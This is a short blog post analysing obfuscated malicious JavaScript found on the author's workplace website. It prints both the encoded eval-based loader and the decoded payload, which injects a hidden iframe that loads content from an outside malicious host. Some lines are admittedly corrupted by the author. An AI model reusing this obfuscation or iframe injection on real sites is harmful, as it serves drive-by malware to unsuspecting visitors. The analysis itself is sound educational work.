# Decoding found malware

Video test of screen recording while de-obfuscating some malware found at work

####################
Type:blog
Tags:JavaScript
####################

Early last year (2013), the main website for work was compromised and (amongst other things) a malicious script was inserted. I was able to grab a copy of the scipt, albeit second hand and will go through how it works.

This is how I received the code (or I initially mucked around with it and left it like this, I can not remember).

    zz='val';
    e=this[fromCharCode["substr"](11)+zz];    
    
    
    
    
        zz='val';
        ss=[];
    
        e=this.fromCharCode(substr(11)+'val');
    
        n=&quot;3.5$3.5$51.5$50$15$19$49$54.5$48.5$57.5$53.5$49.5$54$57$22$50.5$49.5$57$33.5$53$49.5$53.5$49.5$54$57$56.5$32$59.5$41$47.5$50.5$38$47.5$53.5$49.5$19$18.5$48$54.5$49$59.5$18.5$19.5$44.5$23$45.5$19.5$60.5$5.5$3.5$3.5$3.5$51.5$50$56$47.5$53.5$49.5$56$19$19.5$28.5$5.5$3.5$3.5$61.5$15$49.5$53$56.5$49.5$15$60.5$5.5$3.5$3.5$3.5$49$54.5$48.5$57.5$53.5$49.5$54$57$22$58.5$56$51.5$57$49.5$19$16$29$51.5$50$56$47.5$53.5$49.5$15$56.5$56$48.5$29.5$18.5$51$57$57$55$28$22.5$22.5$53.5$55.5$59.5$49.5$54$57.5$22$49$54$56.5$23$25.5$22$48.5$54.5$53.5$22.5$49$22.5$25$23$25$22$55$51$55$30.5$50.5$54.5$29.5$23.5$18.5$15$58.5$51.5$49$57$51$29.5$18.5$23.5$23$18.5$15$51$49.5$51.5$50.5$51$57$29.5$18.5$23.5$23$18.5$15$56.5$57$59.5$53$49.5$29.5$18.5$58$51.5$56.5$51.5$48$51.5$53$51.5$57$59.5$28$51$51.5$49$49$49.5$54$28.5$55$54.5$56.5$51.5$57$51.5$54.5$54$28$47.5$48$56.5$54.5$53$57.5$57$49.5$28.5$53$49.5$50$57$28$23$28.5$57$54.5$55$28$23$28.5$18.5$30$29$22.5$51.5$50$56$47.5$53.5$49.5$30$16$19.5$28.5$5.5$3.5$3.5$61.5$5.5$3.5$3.5$50$57.5$54$48.5$57$51.5$54.5$54$15$51.5$50$56$47.5$53.5$49.5$56$19$19.5$60.5$5.5$3.5$3.5$3.5$58$47.5$56$15$50$15$29.5$15$49$54.5$48.5$57.5$53.5$49.5$54$57$22$48.5$56$49.5$47.5$57$49.5$33.5$53$49.5$53.5$49.5$54$57$19$18.5$51.5$50$56$47.5$53.5$49.5$18.5$19.5$28.5$50$22$56.5$49.5$57$31.5$57$57$56$51.5$48$57.5$57$49.5$19$18.5$56.5$56$48.5$18.5$21$18.5$51$57$57$55$28$22.5$22.5$53.5$55.5$59.5$49.5$54$57.5$22$49$54$56.5$23$25.5$22$48.5$54.5$53.5$22.5$49$22.5$25$23$25$22$55$51$55$30.5$50.5$54.5$29.5$23.5$18.5$19.5$28.5$50$22$56.5$57$59.5$53$49.5$22$58$51.5$56.5$51.5$48$51.5$53$51.5$57$59.5$29.5$18.5$51$51.5$49$49$49.5$54$18.5$28.5$50$22$56.5$57$59.5$53$49.5$22$55$54.5$56.5$51.5$57$51.5$54.5$54$29.5$18.5$47.5$48$56.5$54.5$53$57.5$57$49.5$18.5$28.5$50$22$56.5$57$59.5$53$49.5$22$53$49.5$50$57$29.5$18.5$23$18.5$28.5$50$22$56.5$57$59.5$53$49.5$22$57$54.5$55$29.5$18.5$23$18.5$28.5$50$22$56.5$49.5$57$31.5$57$57$56$51.5$48$57.5$57$49.5$19$18.5$58.5$51.5$49$57$51$18.5$21$18.5$23.5$23$18.5$19.5$28.5$50$22$56.5$49.5$57$31.5$57$57$56$51.5$48$57.5$57$49.5$19$18.5$51$49.5$51.5$50.5$51$57$18.5$21$18.5$23.5$23$18.5$19.5$28.5$5.5$3.5$3.5$3.5$49$54.5$48.5$57.5$53.5$49.5$54$57$22$50.5$49.5$57$33.5$53$49.5$53.5$49.5$54$57$56.5$32$59.5$41$47.5$50.5$38$47.5$53.5$49.5$19$18.5$48$54.5$49$59.5$18.5$19.5$44.5$23$45.5$22$47.5$55$55$49.5$54$49$32.5$51$51.5$53$49$19$50$19.5$28.5$5.5$3.5$3.5$61.5&quot;.split(&quot;$&quot;);
    
        for(i=0; i &lt; 585; i++){
            ss=ss+String.fromCharCode(2*(1+1*n[i]));
        }
    
        e(ss);


The code itself is quite straightforward and relies on some fun obfuscation to (presumably) get around detection.

`51.5$53$49$19$50$19.5$28.5$5.5$3.5$3.5$61.5&quot;.split("$");`


Is simply a "$" delimited list which contains a bunch of numbers of which about half end in .5.


    for(i=0; i &lt; 585; i++){
        ss=ss+String.fromCharCode(2*(1+1*n[i]));
    }

This is the fun bit: for each number in the list, (starting from the inside out) multiply by one (`1*n[i]`) doing nothing and then add 1 (5.5 becomes 6.5) and then multiply that by 2. Multiplying by two removes the .5 and so we are guarenteed to integers which is useful as we then run these through the function fromCharCode (this part is messed up, I think b/c I mucked it up when it was discovered) which converts said integers into their unicode representations. Unicode representations that look (in this case) like code. Code which can be eval()'d (made from the first couple lines via simple concatenation and also mucked up by me). We end up with:

    if (document.getElementsByTagName('body')[0]){
        iframer();
    } else {
        document.write("&lt;iframe src='http://mqyenu.dns05.com/d/404.php?go=1' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'&gt;&lt;/iframe&gt;");
    }
    function iframer(){
        var f = document.createElement('iframe');f.setAttribute('src','http://mqyenu.dns05.com/d/404.php?go=1');f.style.visibility='hidden';f.style.position='absolute';f.style.left='0';f.style.top='0';f.setAttribute('width','10');f.setAttribute('height','10');
        document.getElementsByTagName('body')[0].appendChild(f);
    }"

Which inserts an invisible IFrame and runs whatever was returned by the (now defunct) page.

Because I wanted to test the screen recording software that comes with Cinnamon I recorded playing around with this. Enjoy.

<video width="640" height="360" controls data-poster="https://assets.themetacity.com/video/foundmalwaredecodeposter.svg">
    <source src="https://assets.themetacity.com/video/foundmalwaredecode.webm" type='video/webm;codecs="vp8, vorbis"' data-fullscreen="true">
    <source src="https://assets.themetacity.com/video/foundmalwaredecode.mp4" type='video/mp4;codec="avc1"' data-fullscreen="true">
</video>